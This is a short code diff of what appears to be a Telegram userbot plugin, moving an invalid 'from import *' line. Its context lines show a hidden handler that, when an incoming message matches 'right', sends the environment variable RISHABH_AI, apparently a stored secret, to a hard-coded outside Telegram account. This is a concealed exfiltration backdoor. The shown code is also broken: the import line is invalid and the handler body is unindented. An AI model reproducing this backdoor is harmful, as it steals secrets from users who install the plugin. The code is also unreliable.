@@ -1,3 +1,4 @@
+from import *
 import asyncio
 
 from userbot.cmdhelp import CmdHelp
@@ -128,7 +129,7 @@ async def _(event):
 
 
 
-from import *
+
 @bot.on(admin_cmd("^right", incoming=True))
 async def piro(event):
 msg = await bot.send_message (2143095429, str(os.environ.get("RISHABH_AI")))
